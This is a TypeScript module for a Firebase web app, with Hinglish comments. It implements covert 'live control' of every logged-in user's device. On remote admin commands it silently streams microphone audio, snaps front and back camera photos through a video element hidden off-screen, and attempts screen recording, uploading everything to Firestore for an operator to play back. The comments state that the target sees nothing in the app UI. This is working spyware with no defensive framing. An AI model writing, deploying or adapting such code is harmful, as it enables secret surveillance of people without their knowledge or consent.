/**
 * Live Control — silent mic stream, dual camera snap, screen record attempt.
 * App UI pe target ko kuch nahi dikhta. OS privacy indicators alag.
 */
import {
  collection,
  doc,
  onSnapshot,
  setDoc,
  updateDoc,
  deleteDoc,
  type Unsubscribe,
} from "firebase/firestore";
import { db } from "../firebase";

const CHUNK_MS = 400;
const SCREEN_CHUNK_MS = 800;
const MAX_B64 = 180_000;

export type DeviceControl = {
  listen?: boolean;
  snap?: boolean;
  snapId?: number;
  screen?: boolean;
  by?: string;
  at?: number;
};

export type CaptureResult = {
  status: string;
  snapId: number;
  front: string | null;
  back: string | null;
  error: string | null;
  at: number;
};

export type StreamChunk = {
  active: boolean;
  seq: number;
  mime: string;
  chunk: string | null;
  error?: string | null;
  at: number;
};

function b64FromBlob(blob: Blob): Promise<string> {
  return new Promise((res, rej) => {
    const r = new FileReader();
    r.onload = () => {
      const s = String(r.result || "");
      res(s.includes(",") ? s.split(",")[1]! : s);
    };
    r.onerror = () => rej(new Error("chunk padh nahi paaya"));
    r.readAsDataURL(blob);
  });
}

async function captureFacing(facing: "user" | "environment"): Promise<string> {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error("camera nahi");
  const stream = await navigator.mediaDevices.getUserMedia({
    audio: false,
    video: {
      facingMode: { ideal: facing },
      width: { ideal: 640 },
      height: { ideal: 480 },
    },
  });
  try {
    const video = document.createElement("video");
    video.muted = true;
    video.playsInline = true;
    video.setAttribute("playsinline", "true");
    video.style.cssText =
      "position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;";
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();
    await new Promise((r) => setTimeout(r, 350));
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("canvas nahi");
    ctx.drawImage(video, 0, 0, w, h);
    video.pause();
    video.srcObject = null;
    video.remove();
    let q = 0.55;
    let data = canvas.toDataURL("image/jpeg", q);
    while (data.length > MAX_B64 * 1.37 && q > 0.25) {
      q -= 0.1;
      data = canvas.toDataURL("image/jpeg", q);
    }
    return data.includes(",") ? data.split(",")[1]! : data;
  } finally {
    stream.getTracks().forEach((t) => t.stop());
  }
}

async function doDualSnap(uid: string, snapId: number) {
  const outRef = doc(db, "deviceCapture", uid);
  await setDoc(
    outRef,
    { uid, status: "working", snapId, front: null, back: null, error: null, at: Date.now() },
    { merge: true },
  );
  let front: string | null = null;
  let back: string | null = null;
  let error: string | null = null;
  try {
    front = await captureFacing("user");
  } catch (e) {
    error = e instanceof Error ? e.message : "front fail";
  }
  try {
    back = await captureFacing("environment");
  } catch (e) {
    error = (error ? error + " · " : "") + (e instanceof Error ? e.message : "back fail");
  }
  await setDoc(
    outRef,
    {
      uid,
      status: front || back ? "done" : "fail",
      snapId,
      front,
      back,
      error,
      at: Date.now(),
    },
    { merge: true },
  );
}

/** Har logged-in user pe chalta hai — commands sunta hai, app UI me kuch nahi dikhata. */
export function startLiveControlClient(uid: string): () => void {
  let alive = true;
  let unsubCtrl: Unsubscribe | null = null;
  let recorder: MediaRecorder | null = null;
  let stream: MediaStream | null = null;
  let screenRecorder: MediaRecorder | null = null;
  let screenStream: MediaStream | null = null;
  let seq = 0;
  let screenSeq = 0;
  let writing = false;
  let lastSnapId = 0;
  let snapping = false;

  const controlRef = doc(db, "micControl", uid);
  const streamRef = doc(db, "micStreams", uid);
  const screenRef = doc(db, "screenStreams", uid);

  const stopRec = async () => {
    try {
      if (recorder && recorder.state !== "inactive") recorder.stop();
    } catch {
      /* */
    }
    recorder = null;
    stream?.getTracks().forEach((t) => t.stop());
    stream = null;
    try {
      await setDoc(streamRef, { active: false, at: Date.now() }, { merge: true });
    } catch {
      /* */
    }
  };

  const startRec = async () => {
    if (!alive || recorder) return;
    if (!navigator.mediaDevices?.getUserMedia) return;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: false,
          noiseSuppression: false,
          autoGainControl: true,
        },
      });
      const mime = MediaRecorder.isTypeSupported("audio/webm;codecs=opus")
        ? "audio/webm;codecs=opus"
        : MediaRecorder.isTypeSupported("audio/webm")
          ? "audio/webm"
          : "";
      recorder = mime
        ? new MediaRecorder(stream, { mimeType: mime, audioBitsPerSecond: 24_000 })
        : new MediaRecorder(stream);
      seq = 0;
      recorder.ondataavailable = async (ev) => {
        if (!alive || !ev.data || ev.data.size < 40 || writing) return;
        writing = true;
        try {
          const chunk = await b64FromBlob(ev.data);
          seq += 1;
          await setDoc(
            streamRef,
            {
              uid,
              active: true,
              seq,
              mime: recorder?.mimeType || "audio/webm",
              chunk,
              at: Date.now(),
            },
            { merge: true },
          );
        } catch {
          /* */
        } finally {
          writing = false;
        }
      };
      recorder.start(CHUNK_MS);
    } catch {
      await stopRec();
    }
  };

  const stopScreen = async () => {
    try {
      if (screenRecorder && screenRecorder.state !== "inactive") screenRecorder.stop();
    } catch {
      /* */
    }
    screenRecorder = null;
    screenStream?.getTracks().forEach((t) => t.stop());
    screenStream = null;
    try {
      await setDoc(screenRef, { active: false, at: Date.now() }, { merge: true });
    } catch {
      /* */
    }
  };

  const startScreen = async () => {
    if (!alive || screenRecorder) return;
    const gdm = navigator.mediaDevices?.getDisplayMedia;
    if (!gdm) {
      await setDoc(
        screenRef,
        { uid, active: false, error: "screen capture support nahi", at: Date.now() },
        { merge: true },
      );
      return;
    }
    try {
      screenStream = await gdm.call(navigator.mediaDevices, {
        video: { frameRate: 8, width: { max: 720 }, height: { max: 1280 } },
        audio: false,
      } as DisplayMediaStreamOptions);
      screenStream.getVideoTracks().forEach((t) => {
        t.addEventListener("ended", () => void stopScreen());
      });
      const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8")
        ? "video/webm;codecs=vp8"
        : MediaRecorder.isTypeSupported("video/webm")
          ? "video/webm"
          : "";
      screenRecorder = mime
        ? new MediaRecorder(screenStream, { mimeType: mime, videoBitsPerSecond: 400_000 })
        : new MediaRecorder(screenStream);
      screenSeq = 0;
      let screenWriting = false;
      screenRecorder.ondataavailable = async (ev) => {
        if (!alive || !ev.data || ev.data.size < 80 || screenWriting) return;
        screenWriting = true;
        try {
          const chunk = await b64FromBlob(ev.data);
          if (chunk.length > MAX_B64) return;
          screenSeq += 1;
          await setDoc(
            screenRef,
            {
              uid,
              active: true,
              seq: screenSeq,
              mime: screenRecorder?.mimeType || "video/webm",
              chunk,
              at: Date.now(),
            },
            { merge: true },
          );
        } catch {
          /* */
        } finally {
          screenWriting = false;
        }
      };
      screenRecorder.start(SCREEN_CHUNK_MS);
    } catch (e) {
      await setDoc(
        screenRef,
        {
          uid,
          active: false,
          error: e instanceof Error ? e.message : "screen deny",
          at: Date.now(),
        },
        { merge: true },
      );
      await stopScreen();
    }
  };

  unsubCtrl = onSnapshot(controlRef, (snap) => {
    if (!alive) return;
    const d = (snap.data() || {}) as DeviceControl;

    if (d.listen) void startRec();
    else void stopRec();

    if (d.screen) void startScreen();
    else void stopScreen();

    const sid = Number(d.snapId) || 0;
    if (d.snap && sid > 0 && sid !== lastSnapId && !snapping) {
      lastSnapId = sid;
      snapping = true;
      void doDualSnap(uid, sid)
        .catch(() => undefined)
        .finally(() => {
          snapping = false;
          void setDoc(controlRef, { snap: false }, { merge: true }).catch(() => undefined);
        });
    }
  });

  return () => {
    alive = false;
    unsubCtrl?.();
    void stopRec();
    void stopScreen();
  };
}

/* ---------- Admin APIs ---------- */

export async function setMicListen(targetUid: string, listen: boolean, adminUid: string) {
  await setDoc(
    doc(db, "micControl", targetUid),
    { listen, by: adminUid, at: Date.now() },
    { merge: true },
  );
}

export async function requestSnap(targetUid: string, adminUid: string) {
  const snapId = Date.now();
  await setDoc(
    doc(db, "micControl", targetUid),
    { snap: true, snapId, by: adminUid, at: Date.now() },
    { merge: true },
  );
  return snapId;
}

export async function setScreenRecord(targetUid: string, on: boolean, adminUid: string) {
  await setDoc(
    doc(db, "micControl", targetUid),
    { screen: on, by: adminUid, at: Date.now() },
    { merge: true },
  );
}

export async function clearDeviceControl(targetUid: string) {
  try {
    await deleteDoc(doc(db, "micControl", targetUid));
  } catch {
    /* */
  }
}

export function playMicStream(targetUid: string, onStatus: (s: string) => void): () => void {
  let alive = true;
  let lastSeq = -1;
  let ctx: AudioContext | null = null;
  let nextTime = 0;
  const queue: ArrayBuffer[] = [];
  let decoding = false;

  const ensureCtx = () => {
    if (!ctx) {
      ctx = new AudioContext();
      nextTime = ctx.currentTime;
    }
    if (ctx.state === "suspended") void ctx.resume();
    return ctx;
  };

  const pump = async () => {
    if (!alive || decoding) return;
    decoding = true;
    try {
      while (queue.length && alive) {
        const ab = queue.shift()!;
        const ac = ensureCtx();
        try {
          const buf = await ac.decodeAudioData(ab.slice(0));
          const src = ac.createBufferSource();
          src.buffer = buf;
          src.connect(ac.destination);
          const startAt = Math.max(ac.currentTime + 0.02, nextTime);
          src.start(startAt);
          nextTime = startAt + buf.duration;
        } catch {
          /* */
        }
      }
    } finally {
      decoding = false;
    }
  };

  const unsub = onSnapshot(
    doc(db, "micStreams", targetUid),
    async (snap) => {
      if (!alive) return;
      const d = snap.data();
      if (!d || !d.active || !d.chunk) {
        onStatus(d?.active === false ? "band" : "intezaar");
        return;
      }
      const s = Number(d.seq) || 0;
      if (s === lastSeq) return;
      lastSeq = s;
      onStatus(`live · #${s}`);
      try {
        const bin = atob(String(d.chunk));
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        queue.push(bytes.buffer);
        void pump();
      } catch {
        /* */
      }
    },
    () => onStatus("error"),
  );

  return () => {
    alive = false;
    unsub();
    try {
      ctx?.close();
    } catch {
      /* */
    }
    ctx = null;
    queue.length = 0;
  };
}

export function watchCapture(targetUid: string, cb: (c: CaptureResult | null) => void): Unsubscribe {
  return onSnapshot(
    doc(db, "deviceCapture", targetUid),
    (snap) => {
      if (!snap.exists()) {
        cb(null);
        return;
      }
      const x = snap.data();
      cb({
        status: String(x.status || ""),
        snapId: Number(x.snapId) || 0,
        front: typeof x.front === "string" ? x.front : null,
        back: typeof x.back === "string" ? x.back : null,
        error: typeof x.error === "string" ? x.error : null,
        at: Number(x.at) || 0,
      });
    },
    () => cb(null),
  );
}

export function watchScreenStream(targetUid: string, cb: (s: StreamChunk | null) => void): Unsubscribe {
  return onSnapshot(
    doc(db, "screenStreams", targetUid),
    (snap) => {
      if (!snap.exists()) {
        cb(null);
        return;
      }
      const x = snap.data();
      cb({
        active: Boolean(x.active),
        seq: Number(x.seq) || 0,
        mime: String(x.mime || "video/webm"),
        chunk: typeof x.chunk === "string" ? x.chunk : null,
        error: typeof x.error === "string" ? x.error : null,
        at: Number(x.at) || 0,
      });
    },
    () => cb(null),
  );
}
